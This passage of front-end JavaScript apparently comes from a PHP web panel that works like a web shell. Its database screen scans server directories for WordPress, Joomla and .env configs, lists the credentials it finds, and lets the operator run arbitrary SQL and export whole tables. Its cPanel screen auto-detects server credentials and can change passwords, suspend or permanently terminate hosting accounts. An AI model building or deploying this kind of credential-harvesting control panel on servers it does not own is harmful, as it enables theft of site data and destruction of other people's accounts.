    msg.style.color=r.ok?'var(--green)':'#fca5a5';msg.textContent=r.ok?'Backup synced.':'Sync failed (check database connection).';
  }catch{msg.textContent='Sync failed.';msg.style.color='#fca5a5';}
}
document.getElementById('guardBtn')?.addEventListener('click',()=>{openMod('guardOv');guardLoad();});
document.getElementById('guardClose')?.addEventListener('click',()=>closeMod('guardOv'));
document.getElementById('sqlQClose')?.addEventListener('click',()=>closeMod('sqlQueryOv'));
async function sqlShowPicker(){
  const el=document.getElementById('sqlBody');
  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)"><svg viewBox="0 0 24 24" style="width:28px;height:28px;stroke:currentColor;fill:none;stroke-width:1.5;margin:0 auto 10px;display:block"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>Scanning for database configs…</div>';
  try{
    const r=await fetch('?x=sqlscan').then(r=>r.json());
    if(r.error){el.innerHTML='<div class="empty" style="padding:32px"><p>'+esc(r.error)+'</p></div>';return;}
    const dbs=r.databases||[];
    const obdHint=r.open_basedir?.length?`<div style="padding:8px 16px;background:rgba(245,158,11,.1);border-bottom:1px solid var(--border);font-size:11px;color:#f4a333">Restricted to: <span style="font-family:monospace">${esc(r.open_basedir.join(', '))}</span></div>`:'';
    const typeColors={wordpress:'#5bc0de',joomla:'#f4a333',env:'#22c55e',generic:'#85898C'};
    const cards=dbs.map((d,i)=>`<div class="sql-db-card" data-i="${i}" style="display:flex;align-items:center;gap:14px;padding:12px 16px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .15s" onmouseover="this.style.background='rgba(255,255,255,.04)'" onmouseout="this.style.background=''">
      <svg viewBox="0 0 24 24" style="width:22px;height:22px;stroke:#85898C;fill:none;stroke-width:1.5;flex-shrink:0"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
      <div style="flex:1;min-width:0">
        <div style="display:flex;align-items:center;gap:8px;margin-bottom:2px">
          <span style="background:rgba(133,137,140,.15);color:${typeColors[d.type]||'#85898C'};padding:1px 7px;border-radius:20px;font-size:10px;font-weight:700;text-transform:uppercase">${esc(d.type)}</span>
          <span style="font-size:13px;font-weight:600;color:var(--t1)">${esc(d.db)}</span>
          <span style="font-size:11px;color:var(--t3)">@ ${esc(d.host)}</span>
        </div>
        <div style="font-size:10.5px;color:var(--t3);font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(d.file)}</div>
        <div style="font-size:10.5px;color:var(--t3);margin-top:1px">user: <strong style="color:var(--t2)">${esc(d.user)}</strong>${d.pass?' · password: ****':' · no password'}</div>
      </div>
      <svg viewBox="0 0 24 24" style="width:14px;height:14px;stroke:var(--t3);fill:none;stroke-width:2;flex-shrink:0"><polyline points="9 18 15 12 9 6"/></svg>
    </div>`).join('');
    el.innerHTML=`
      <div style="padding:10px 16px;border-bottom:1px solid var(--border);font-size:12px;color:var(--t2)">${dbs.length} database config${dbs.length!==1?'s':''} found · ${r.scanned||0} dirs scanned</div>
      ${obdHint}
      ${dbs.length?`<div style="overflow:auto;max-height:36vh">${cards}</div>`:'<div class="empty" style="padding:24px"><p>No configs found automatically. Use manual connection below.</p></div>'}
      <div style="padding:14px 16px;border-top:1px solid var(--border)">
        <div style="font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:10px">Manual Connection</div>
        <div style="display:grid;grid-template-columns:1fr 80px;gap:8px;margin-bottom:8px">
          <input type="text" id="sqlManHost" class="inp" value="localhost" placeholder="Host" style="font-size:12px;font-family:monospace">
          <input type="number" id="sqlManPort" class="inp" value="3306" placeholder="Port" style="font-size:12px;font-family:monospace">
        </div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">
          <input type="text" id="sqlManUser" class="inp" placeholder="Username" style="font-size:12px">
          <input type="password" id="sqlManPass" class="inp" placeholder="Password" style="font-size:12px">
        </div>
        <div style="display:flex;gap:8px">
          <input type="text" id="sqlManDB" class="inp" placeholder="Database name" style="flex:1;font-size:12px">
          <button class="btn btn-p" id="sqlManBtn" style="white-space:nowrap;font-size:12px">Connect</button>
        </div>
      </div>`;
    const _dbs=dbs;
    el.querySelectorAll('.sql-db-card').forEach(c=>c.addEventListener('click',()=>{
      const d=_dbs[+c.dataset.i];
       sqlCreds={host:d.host,port:+(d.port)||(d.driver==='pgsql'?5432:3306),user:d.user,pass:d.pass,db:d.db,driver:d.driver||'mysql'};
      sqlLoadTables();
    }));
    document.getElementById('sqlManBtn').addEventListener('click',()=>{
      const h=document.getElementById('sqlManHost').value.trim()||'localhost';
      const pt=+document.getElementById('sqlManPort').value||3306;
      const u=document.getElementById('sqlManUser').value.trim();
      const pw=document.getElementById('sqlManPass').value;
      const db=document.getElementById('sqlManDB').value.trim();
      if(!u||!db){toast('Username and database name are required.');return;}
       sqlCreds={host:h,port:pt,user:u,pass:pw,db:db,driver:'mysql'};sqlLoadTables();
    });
    document.getElementById('sqlManDB')?.addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('sqlManBtn').click();});
   }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Scan failed: '+esc(String(e))+'</div>';}
}
async function sqlLoadTables(){
  const el=document.getElementById('sqlBody');
  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Connecting to <strong>'+esc(sqlCreds.db)+'</strong>…</div>';
  try{
    const d=await sqlPost('sqltables');
    if(d.error){el.innerHTML=`<div style="padding:11px 16px;border-bottom:1px solid var(--border)"><button class="btn btn-s" id="sqlBack1" style="font-size:11px">← Back</button></div><div class="empty" style="padding:32px"><p>${esc(d.error)}</p></div>`;document.getElementById('sqlBack1')?.addEventListener('click',sqlShowPicker);return;}
    const tables=d.tables||[];
    function sqlFmtSz(b){if(b>1048576)return(b/1048576).toFixed(1)+' MB';if(b>1024)return(b/1024).toFixed(0)+' KB';return b+' B';}
    const rows=tables.map(t=>`<tr class="sql-tbl-row" data-name="${esc(t.name)}" style="cursor:pointer" onmouseover="this.style.background='rgba(255,255,255,.03)'" onmouseout="this.style.background=''">
      <td style="padding:8px 12px;font-family:monospace;font-size:12px;font-weight:600;color:var(--link)">${esc(t.name)}</td>
      <td style="padding:8px 12px;font-size:11.5px;color:var(--t2);text-align:right">${t.rows.toLocaleString()}</td>
      <td style="padding:8px 12px;font-size:11.5px;color:var(--t3);text-align:right">${sqlFmtSz(t.size)}</td>
      <td style="padding:8px 12px;font-size:11px;color:var(--t3)">${esc(t.engine)}</td>
    </tr>`).join('');
    el.innerHTML=`
      <div style="display:flex;align-items:center;gap:10px;padding:10px 16px;border-bottom:1px solid var(--border);flex-wrap:wrap">
        <button class="btn btn-s" id="sqlBack2" style="font-size:11px">← Back</button>
        <span style="flex:1;font-size:12px;color:var(--t2)"><strong style="color:var(--t1)">${esc(sqlCreds.db)}</strong> <span style="color:var(--t3)">@ ${esc(sqlCreds.host)} · user: ${esc(sqlCreds.user)}</span></span>
        <button class="btn btn-p" id="sqlQueryBtnT" style="font-size:12px;padding:6px 12px"><svg viewBox="0 0 24 24" style="width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;margin-right:4px;vertical-align:-2px"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Run SQL</button>
      </div>
      <div style="overflow:auto;max-height:52vh">
        <table class="log-t" style="width:100%">
          <thead><tr><th style="padding:8px 12px;text-align:left">Table</th><th style="padding:8px 12px;text-align:right">~Rows</th><th style="padding:8px 12px;text-align:right">Size</th><th style="padding:8px 12px">Engine</th></tr></thead>
          <tbody>${rows||'<tr><td colspan="4" style="padding:24px;text-align:center;color:var(--t3)">No tables found.</td></tr>'}</tbody>
        </table>
      </div>`;
    document.getElementById('sqlBack2')?.addEventListener('click',sqlShowPicker);
    document.getElementById('sqlQueryBtnT')?.addEventListener('click',sqlOpenQuery);
    el.querySelectorAll('.sql-tbl-row').forEach(r=>r.addEventListener('click',()=>{sqlCurrentTable=r.dataset.name;sqlBrowseTable(sqlCurrentTable,1);}));
  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Error: '+esc(String(e))+'</div>';}
}
async function sqlBrowseTable(table,page){
  const el=document.getElementById('sqlBody');
  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading <strong>'+esc(table)+'</strong>…</div>';
  try{
    const d=await sqlPost('sqlbrowse',{sql_table:table,sql_page:page});
    if(d.error){el.innerHTML=`<div style="padding:11px 16px;border-bottom:1px solid var(--border)"><button class="btn btn-s" id="sqlBack3" style="font-size:11px">← Tables</button></div><div class="empty" style="padding:32px"><p>${esc(d.error)}</p></div>`;document.getElementById('sqlBack3')?.addEventListener('click',sqlLoadTables);return;}
    sqlCurrentPage=page;
    const cols=d.columns||[];const rows=d.rows||[];
    const thead='<tr>'+cols.map(c=>`<th style="padding:7px 10px;white-space:nowrap;font-size:11px;text-align:left"><span style="font-family:monospace">${esc(c.name)}</span><br><span style="font-weight:400;color:var(--t3);font-size:10px">${esc(c.type)}</span></th>`).join('')+'</tr>';
    const tbody=rows.map(row=>'<tr>'+row.map(v=>`<td style="padding:6px 10px;font-size:11.5px;max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:monospace">${v===null?'<span style="color:var(--t3);font-style:italic">NULL</span>':esc(String(v))}</td>`).join('')+'</tr>').join('');
    const pages=d.pages||1;
    const pager=pages>1?`<div style="display:flex;align-items:center;gap:8px"><button class="btn btn-xs btn-g" ${page<=1?'disabled':''} id="sqlPrev">← Prev</button><span style="font-size:12px;color:var(--t2)">Page ${page} / ${pages} &nbsp;(${d.total.toLocaleString()} rows)</span><button class="btn btn-xs btn-g" ${page>=pages?'disabled':''} id="sqlNext">Next →</button></div>`:'<span style="font-size:11px;color:var(--t3)">${d.total.toLocaleString()} rows</span>';
    el.innerHTML=`
      <div style="display:flex;align-items:center;gap:8px;padding:10px 16px;border-bottom:1px solid var(--border);flex-wrap:wrap">
        <button class="btn btn-s" id="sqlBack4" style="font-size:11px">← Tables</button>
        <span style="font-size:12px;font-weight:600;color:var(--t1);font-family:monospace;flex:1">${esc(table)}</span>
        <button class="btn btn-xs btn-g" id="sqlExpCsv" style="font-size:11px">↓ CSV</button>
        <button class="btn btn-xs btn-g" id="sqlExpSql" style="font-size:11px">↓ SQL</button>
        <button class="btn btn-p" id="sqlQueryBtnB" style="font-size:11px;padding:5px 10px">Run SQL</button>
      </div>
      <div style="overflow:auto;max-height:46vh"><table class="log-t" style="width:100%;min-width:max-content"><thead>${thead}</thead><tbody>${tbody||'<tr><td colspan="100" style="padding:24px;text-align:center;color:var(--t3)">Empty table.</td></tr>'}</tbody></table></div>
      <div style="padding:10px 16px;border-top:1px solid var(--border)">${pager}</div>`;
    document.getElementById('sqlBack4')?.addEventListener('click',sqlLoadTables);
    document.getElementById('sqlQueryBtnB')?.addEventListener('click',sqlOpenQuery);
    document.getElementById('sqlExpCsv')?.addEventListener('click',()=>sqlExportTable('csv'));
    document.getElementById('sqlExpSql')?.addEventListener('click',()=>sqlExportTable('sql'));
    document.getElementById('sqlPrev')?.addEventListener('click',()=>sqlBrowseTable(table,page-1));
    document.getElementById('sqlNext')?.addEventListener('click',()=>sqlBrowseTable(table,page+1));
  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Error: '+esc(String(e))+'</div>';}
}
document.getElementById('sqlRunBtn')?.addEventListener('click',async()=>{
  const sql=document.getElementById('sqlQueryInput').value.trim();
  if(!sql){toast('Enter a SQL query.');return;}
  const btn=document.getElementById('sqlRunBtn');
  btn.disabled=true;btn.textContent='Running…';
  const out=document.getElementById('sqlQueryOut');
  out.innerHTML='<div style="color:var(--t3);padding:12px">Running…</div>';
  try{
    const d=await sqlPost('sqlquery',{sql_query:sql});
    if(d.error){out.innerHTML=`<div style="padding:12px;color:#fca5a5;font-family:monospace;font-size:12px;white-space:pre-wrap">${esc(d.error)}</div>`;btn.disabled=false;btn.textContent='Run Query';return;}
    if(d.columns&&d.columns.length){
      const thead='<tr>'+d.columns.map(c=>`<th style="padding:7px 10px;font-size:11px;font-family:monospace;white-space:nowrap;text-align:left">${esc(c)}</th>`).join('')+'</tr>';
      const tbody=d.rows.map(row=>'<tr>'+row.map(v=>`<td style="padding:6px 10px;font-size:11.5px;font-family:monospace;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${v===null?'<span style="color:var(--t3);font-style:italic">NULL</span>':esc(String(v))}</td>`).join('')+'</tr>').join('');
      out.innerHTML=(d.limited?'<div style="padding:6px 12px;font-size:11px;color:#f4a333;background:rgba(244,163,51,.1)">Showing first 500 rows.</div>':'')+'<div style="overflow:auto;max-height:38vh"><table class="log-t" style="width:100%;min-width:max-content"><thead>'+thead+'</thead><tbody>'+tbody+'</tbody></table></div><div style="padding:8px 12px;font-size:11px;color:var(--t3)">'+d.rows.length+' row'+(d.rows.length!==1?'s':'')+' returned.</div>';
    } else {
      out.innerHTML='<div style="padding:14px;color:var(--green);font-size:13px">✓ Query OK · Affected rows: '+d.affected+(d.insert_id?' · Insert ID: '+d.insert_id:'')+'</div>';
      if(sqlCurrentTable)sqlBrowseTable(sqlCurrentTable,sqlCurrentPage);else sqlLoadTables();
    }
  }catch(e){out.innerHTML='<div style="padding:12px;color:#fca5a5">'+esc(String(e))+'</div>';}
  btn.disabled=false;btn.textContent='Run Query';
});
async function sqlExportTable(fmt){
  const fd=new FormData();fd.append('csrf_token',CSRF);
  fd.append('sql_host',sqlCreds.host);fd.append('sql_port',sqlCreds.port);
  fd.append('sql_user',sqlCreds.user);fd.append('sql_pass',sqlCreds.pass);fd.append('sql_db',sqlCreds.db);
  fd.append('sql_table',sqlCurrentTable);fd.append('sql_fmt',fmt);
  try{
    const r=await fetch('?x=sqlexport',{method:'POST',body:fd});
    if(!r.ok){toast('Export failed.');return;}
    const blob=await r.blob();const url=URL.createObjectURL(blob);
    const a=document.createElement('a');a.href=url;a.download=sqlCurrentTable+'.'+(fmt==='csv'?'csv':'sql');a.click();
    setTimeout(()=>URL.revokeObjectURL(url),2000);
  }catch(e){toast('Export error: '+String(e));}
}

/* ═══════════════════════════════════════
   CPANEL MANAGER
═══════════════════════════════════════ */
(function(){
const cpOv='cpanelOv',cpAccBody=()=>document.getElementById('cpanelAccountsBody'),
      cpConnBody=()=>document.getElementById('cpanelConnBody');

/* ── Tab switching ── */
document.querySelectorAll('.cpanel-tab-btn').forEach(btn=>btn.addEventListener('click',()=>{
  const tab=btn.dataset.tab;
  cpSwitchTab(tab);
  if(tab==='connect')renderCpConn();
  if(tab==='accounts')loadCpAccounts();
}));

/* ── Open / close ── */
document.getElementById('cpanelBtn')?.addEventListener('click',()=>{
  openMod(cpOv);
  // Show accounts tab, attempt silent auto-connect, load accounts immediately
  cpSwitchTab('accounts');
  cpAutoConnectThenLoad();
});

/* Auto-connect helper: tries server-side auto-detection first, then loads accounts.
   Falls back to the Connection tab only if every method fails. */
async function cpAutoConnectThenLoad(){
  const el=cpAccBody();
  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)"><svg viewBox="0 0 24 24" style="width:28px;height:28px;stroke:currentColor;fill:none;stroke-width:1.5;margin-bottom:10px;display:block;margin-inline:auto"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Connecting to cPanel…</div>';
  try{
    const ac=await fetch('?x=cpanel_auto_connect').then(r=>r.json());
    if(ac.ok){
      // Connected! Load accounts right away.
      await loadCpAccounts();
    } else {
      // Auto-connect failed — show connection tab so user can enter credentials manually
      el.innerHTML=`
        <div style="padding:36px;text-align:center">
          <svg viewBox="0 0 24 24" style="width:44px;height:44px;stroke:var(--t3);fill:none;stroke-width:1.2;margin-bottom:14px;display:block;margin-inline:auto"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
          <div style="font-size:15px;font-weight:600;color:var(--t2);margin-bottom:8px">Manual connection required</div>
          <div style="font-size:12px;color:var(--t3);margin-bottom:6px;line-height:1.65;max-width:420px;margin-inline:auto">
            Automatic detection did not find cPanel credentials on this server
            ${ac.detected_user?'(detected user: <strong style="color:var(--t2)">'+esc(ac.detected_user)+'</strong>)':''}.
            Enter your WHM/cPanel credentials in the <strong style="color:#85898C">Connection</strong> tab.
          </div>
          ${(ac.diagnostics&&ac.diagnostics.length)?`<div style="text-align:left;max-width:420px;margin:12px auto 0;background:var(--raised);border:1px solid var(--b2);border-radius:8px;padding:10px 12px">
            <div style="font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--t3);margin-bottom:6px">Why auto-connect failed</div>
            ${ac.diagnostics.map(d=>`<div style="font-size:11px;color:var(--t3);line-height:1.6;padding:3px 0;border-top:1px dashed var(--b2)">• ${esc(d)}</div>`).join('')}
          </div>`:''}
          <button class="btn btn-p" style="margin-top:14px" id="cpGoConnBtn">Open Connection Settings</button>
        </div>`;
      document.getElementById('cpGoConnBtn')?.addEventListener('click',()=>{cpSwitchTab('connect');renderCpConn();});
    }
  }catch(e){
    el.innerHTML=`<div style="padding:20px;color:#fca5a5">Auto-connect failed: ${esc(String(e))}</div>`;
  }
}

function cpSwitchTab(tab){
  document.querySelectorAll('.cpanel-tab-btn').forEach(b=>{
    const active=b.dataset.tab===tab;
    b.style.borderBottomColor=active?'#85898C':'transparent';
    b.style.color=active?'#85898C':'var(--t3)';
    b.classList.toggle('cpanel-tab-active',active);
  });
  document.getElementById('cpanelAccountsBody').style.display=tab==='accounts'?'':'none';
  document.getElementById('cpanelConnBody').style.display=tab==='connect'?'':'none';
}
document.getElementById('cpanelClose')?.addEventListener('click',()=>closeMod(cpOv));

/* ── Connection panel ── */
function renderCpConn(){
  const el=cpConnBody();
  el.innerHTML='<div style="text-align:center;padding:24px;color:var(--t3)">Detecting…</div>';
  fetch('?x=cpanel_detect').then(r=>r.json()).then(d=>{
    const portList=Object.entries(d.ports||{}).map(([p,l])=>`<span style="display:inline-flex;align-items:center;gap:4px;margin-right:8px;color:#4ade80;font-size:11.5px"><svg viewBox="0 0 24 24" style="width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:2.5"><polyline points="20 6 9 17 4 12"/></svg>:${p} ${esc(l)}</span>`).join('');
    const detInfo=`
      <div style="padding:12px 16px;border-bottom:1px solid var(--b2);display:flex;flex-wrap:wrap;gap:8px;align-items:center">
        <span style="font-size:11px;color:var(--t3)">cPanel installed: <strong style="color:${d.installed?'#4ade80':'#fb923c'}">${d.installed?'Yes':'Not detected'}</strong></span>
        <span style="font-size:11px;color:var(--t3)">Current user: <strong style="color:var(--t2)">${d.current_user?esc(d.current_user):'unknown'}</strong></span>
        <span style="font-size:11px;color:var(--t3)">Host: <strong style="color:var(--t2)">${esc(d.hostname||'-')}</strong></span>
      </div>
      ${portList?`<div style="padding:8px 16px;border-bottom:1px solid var(--b2);font-size:11px;color:var(--t3)">Open ports: ${portList}</div>`:'<div style="padding:8px 16px;border-bottom:1px solid var(--b2);font-size:11px;color:#fb923c">No cPanel ports reachable on localhost. The API calls below may still work if the server is remote.</div>'}`;
    const savedBadge=d.has_creds?`<div style="padding:8px 16px;background:rgba(74,222,128,.07);border-bottom:1px solid var(--b2);font-size:11.5px;color:#4ade80">✓ Credentials saved — user: <strong>${esc(d.saved_user)}</strong> · API: <strong>${d.saved_api}</strong> · port: <strong>${d.saved_port||'-'}</strong></div>`:'';
    el.innerHTML=`
      ${detInfo}
      ${savedBadge}
      <div style="padding:16px">
        <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--t3);margin-bottom:10px">API Credentials</div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">
          <div>
            <label class="lbl">API Type</label>
            <select id="cpConnApiType" class="inp" style="width:100%">
              <option value="whm">WHM (Root / Reseller)</option>
              <option value="cpanel">cPanel (Account level)</option>
            </select>
          </div>
          <div>
            <label class="lbl">Auth Type</label>
            <select id="cpConnAuthType" class="inp" style="width:100%">
              <option value="password">Password</option>
              <option value="token">API Token</option>
            </select>
          </div>
        </div>
        <label class="lbl">Username</label>
        <input type="text" id="cpConnUser" class="inp" style="width:100%;margin-bottom:10px" placeholder="${d.current_user?d.current_user:'root or your cPanel username'}" value="${d.has_creds?esc(d.saved_user):''}">
        <label class="lbl">Password / API Token</label>
        <input type="password" id="cpConnPass" class="inp" style="width:100%;margin-bottom:10px" placeholder="${d.saved_api?'Leave blank to keep saved password':'Enter password or API token'}">
        <label class="lbl">Port</label>
        <select id="cpConnPort" class="inp" style="width:100%;margin-bottom:14px">
          <option value="2087"${(!d.saved_port||d.saved_port===2087)?' selected':''}>2087 — WHM HTTPS (recommended)</option>
          <option value="2086"${d.saved_port===2086?' selected':''}>2086 — WHM HTTP</option>
          <option value="2083"${d.saved_port===2083?' selected':''}>2083 — cPanel HTTPS</option>
          <option value="2082"${d.saved_port===2082?' selected':''}>2082 — cPanel HTTP</option>
        </select>
        <button type="button" id="cpConnSave" class="btn btn-p" style="width:100%">Save &amp; Connect</button>
        <div id="cpConnFeedback" style="margin-top:8px;font-size:12px"></div>
        <div style="margin-top:12px;padding:10px;background:rgba(133,137,140,.07);border-radius:8px;font-size:11px;color:var(--t3);line-height:1.6">
          <strong style="color:var(--t2)">How to get an API token:</strong> Log in to WHM or cPanel → Development → Manage API Tokens → Create. Paste the token in the password field and choose "API Token" above. Credentials are stored only in your browser session and cleared on logout.
        </div>
      </div>`;
    // restore saved api/auth type
    if(d.saved_api)document.getElementById('cpConnApiType').value=d.saved_api;
    document.getElementById('cpConnSave').addEventListener('click',async()=>{
      const btn=document.getElementById('cpConnSave');
      btn.disabled=true;btn.textContent='Saving…';
      const fd=new FormData();
      fd.append('csrf_token',CSRF);
      fd.append('action','cpanel_save_creds');
      fd.append('cp_user',document.getElementById('cpConnUser').value.trim());
      fd.append('cp_pass',document.getElementById('cpConnPass').value);
      fd.append('cp_auth_type',document.getElementById('cpConnAuthType').value);
      fd.append('cp_api_type',document.getElementById('cpConnApiType').value);
      fd.append('cp_port',document.getElementById('cpConnPort').value);
      await fetch('',{method:'POST',body:fd});
      btn.disabled=false;btn.textContent='Save & Connect';
      toast('Credentials saved. Loading accounts…');
      cpSwitchTab('accounts');
      loadCpAccounts();
    });
  }).catch(e=>el.innerHTML=`<div style="padding:20px;color:#fca5a5">Detection failed: ${esc(String(e))}</div>`);
}

/* ── Accounts list ── */
async function loadCpAccounts(){
  const el=cpAccBody();
  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)"><svg viewBox="0 0 24 24" style="width:28px;height:28px;stroke:currentColor;fill:none;stroke-width:1.5;margin-bottom:10px;display:block;margin-inline:auto"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/></svg>Loading accounts…</div>';
  try{
    const d=await fetch('?x=cpanel_accounts').then(r=>r.json());
    if(d.error==='no_creds'){
      el.innerHTML=`
        <div style="padding:40px;text-align:center">
          <svg viewBox="0 0 24 24" style="width:40px;height:40px;stroke:var(--t3);fill:none;stroke-width:1.2;margin-bottom:12px;display:block;margin-inline:auto"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
          <div style="font-size:14px;font-weight:600;color:var(--t2);margin-bottom:6px">Connection required</div>
          <div style="font-size:12px;color:var(--t3);margin-bottom:18px;line-height:1.6">Auto-detection found no cPanel credentials. Enter them in the <strong style="color:#85898C">Connection</strong> tab.</div>
          <button class="btn btn-p" id="cpGoConnect">Open Connection Settings</button>
        </div>`;
      document.getElementById('cpGoConnect')?.addEventListener('click',()=>{cpSwitchTab('connect');renderCpConn();});
      return;
    }
    if(d.error){
      el.innerHTML=`<div style="padding:24px"><div style="margin-bottom:12px;padding:10px;background:rgba(252,165,165,.1);border-radius:8px;color:#fca5a5;font-size:12.5px">${esc(d.error)}</div><button class="btn btn-s" id="cpGoConnErr">Open Connection Settings</button></div>`;
      document.getElementById('cpGoConnErr')?.addEventListener('click',()=>{cpSwitchTab('connect');renderCpConn();});
      return;
    }
    const accts=d.accounts||[];
    const apiLabel=d.api==='whm'?'WHM':'cPanel';
    const rows=accts.map(a=>{
      const suspBadge=a.suspended?`<span style="display:inline-flex;align-items:center;gap:3px;color:#fb923c;font-size:10px;font-weight:700;margin-left:4px"><svg viewBox="0 0 24 24" style="width:10px;height:10px;stroke:currentColor;fill:none;stroke-width:2.5"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>Suspended</span>`:'';
      const diskInfo=a.diskused?`${esc(a.diskused)} / ${esc(a.disklimit||'∞')}`:'—';
      return `<tr>
        <td style="padding:9px 12px;font-weight:600;white-space:nowrap">${esc(a.user)}${suspBadge}</td>
        <td style="padding:9px 12px;font-size:12px;color:var(--t2)">${esc(a.domain||'—')}</td>
        <td style="padding:9px 12px;font-size:11.5px;color:var(--t3)">${esc(a.email||'—')}</td>
        <td style="padding:9px 12px"><span style="background:var(--raised);padding:2px 9px;border-radius:20px;font-size:10.5px">${esc(a.plan||'—')}</span></td>
        <td style="padding:9px 12px;font-size:11.5px;font-family:monospace;color:var(--t3)">${diskInfo}</td>
        <td style="padding:9px 12px;white-space:nowrap">
          <button class="btn btn-xs btn-g cp-chpass-btn" data-user="${esc(a.user)}" style="margin-right:4px">Password</button>
          ${d.api==='whm'?`<button class="btn btn-xs ${a.suspended?'btn-p':'btn-g'} cp-suspend-btn" data-user="${esc(a.user)}" data-suspended="${a.suspended?'1':'0'}" style="margin-right:4px">${a.suspended?'Unsuspend':'Suspend'}</button>
          <button class="btn btn-xs btn-red cp-term-btn" data-user="${esc(a.user)}">Terminate</button>`:''}
        </td></tr>`;
    }).join('');
    el.innerHTML=`
      <div style="padding:10px 14px;border-bottom:1px solid var(--b2);display:flex;align-items:center;gap:10px">
        <span style="font-size:12px;color:var(--t2);flex:1">${accts.length} account${accts.length!==1?'s':''} · ${apiLabel} API · port ${d.port}</span>
        ${d.api==='whm'?`<button class="btn btn-p btn-xs" id="cpCreateAccBtn" style="font-size:11.5px"><svg viewBox="0 0 24 24" style="width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2.5;margin-right:4px;vertical-align:-1px"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>New Account</button>`:''}
        <button class="btn btn-xs btn-g" id="cpRefreshBtn" style="font-size:11.5px">↻ Refresh</button>
      </div>
      <div style="overflow:auto;max-height:52vh">
        ${accts.length?`<table class="log-t" style="width:100%">
          <thead><tr>
            <th style="padding:8px 12px;font-size:11px;text-align:left">Username</th>
            <th style="padding:8px 12px;font-size:11px;text-align:left">Domain</th>
            <th style="padding:8px 12px;font-size:11px;text-align:left">Email</th>
            <th style="padding:8px 12px;font-size:11px;text-align:left">Plan</th>
            <th style="padding:8px 12px;font-size:11px;text-align:left">Disk</th>
            <th style="padding:8px 12px;font-size:11px;text-align:left">Actions</th>
          </tr></thead>
          <tbody>${rows}</tbody>
        </table>`:`<div class="empty" style="padding:40px"><p>No accounts found.</p></div>`}
      </div>`;
    document.getElementById('cpRefreshBtn')?.addEventListener('click',loadCpAccounts);
    document.getElementById('cpCreateAccBtn')?.addEventListener('click',openCpCreate);
    // Change password buttons
    el.querySelectorAll('.cp-chpass-btn').forEach(b=>b.addEventListener('click',()=>{
      document.getElementById('cpPassTargetUser').value=b.dataset.user;
      document.getElementById('cpanelPassTitle').textContent='Change Password: '+b.dataset.user;
      document.getElementById('cpPassNew').value='';
      document.getElementById('cpanelPassFeedback').innerHTML='';
      openMod('cpanelPassOv');
    }));
    // Suspend/Unsuspend
    el.querySelectorAll('.cp-suspend-btn').forEach(b=>b.addEventListener('click',async()=>{
      const action=b.dataset.suspended==='1'?'unsuspend':'suspend';
      const reason=action==='suspend'?prompt('Suspension reason (optional):','Suspended by admin'):'';
      if(reason===null)return;// cancelled
      b.disabled=true;b.textContent='Wait…';
      const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','cpanel_suspend');
      fd.append('cp_target_user',b.dataset.user);fd.append('cp_suspend_action',action);
      if(reason)fd.append('cp_reason',reason);
      await fetch('',{method:'POST',body:fd});
      toast(action==='suspend'?`"${b.dataset.user}" suspended.`:`"${b.dataset.user}" unsuspended.`);
      loadCpAccounts();
    }));
    // Terminate
    el.querySelectorAll('.cp-term-btn').forEach(b=>b.addEventListener('click',async()=>{
      if(!confirm(`PERMANENTLY TERMINATE account "${b.dataset.user}"?\n\nThis deletes all files, databases, and email accounts for this cPanel user. This action CANNOT be undone.`))return;
      if(!confirm(`Are you absolutely sure you want to terminate "${b.dataset.user}"?`))return;
      b.disabled=true;b.textContent='Terminating…';
      const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','cpanel_terminate');
      fd.append('cp_target_user',b.dataset.user);
      await fetch('',{method:'POST',body:fd});
      toast(`Account "${b.dataset.user}" terminated.`);
      loadCpAccounts();
    }));
  }catch(e){el.innerHTML=`<div style="padding:20px;color:#fca5a5">Failed: ${esc(String(e))}</div>`;}
}

/* ── Create Account modal ── */
async function openCpCreate(){
  document.getElementById('cpNewUser').value='';document.getElementById('cpNewDomain').value='';
  document.getElementById('cpNewPass').value='';document.getElementById('cpNewEmail').value='';
  document.getElementById('cpanelCreateFeedback').innerHTML='';
  openMod('cpanelCreateOv');
  // Load plans
